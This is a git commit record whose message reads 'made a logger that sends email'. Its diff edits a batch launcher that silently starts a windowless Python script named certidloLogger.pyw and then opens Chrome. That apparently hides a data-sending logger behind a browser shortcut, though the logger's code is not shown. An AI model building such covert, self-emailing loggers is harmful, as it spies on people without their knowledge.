165a5a4f9493f18adedcd0e88d79b45fb8b34c74
T0mikCZ <oplpet95@gmail.com>
2020-10-28 18:37:04 +0100

    made a logger that sends email

--- OtherStuff/launcher.bat
+++ OtherStuff/launcher.bat
@@ -1,3 +1,3 @@
 @echo off
-start "" "C:\Users\Tomyk\Desktop\certidloLogger.pyw"
+start "" "C:\Python\OtherStuff\certidloLogger.pyw"
 start "" "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
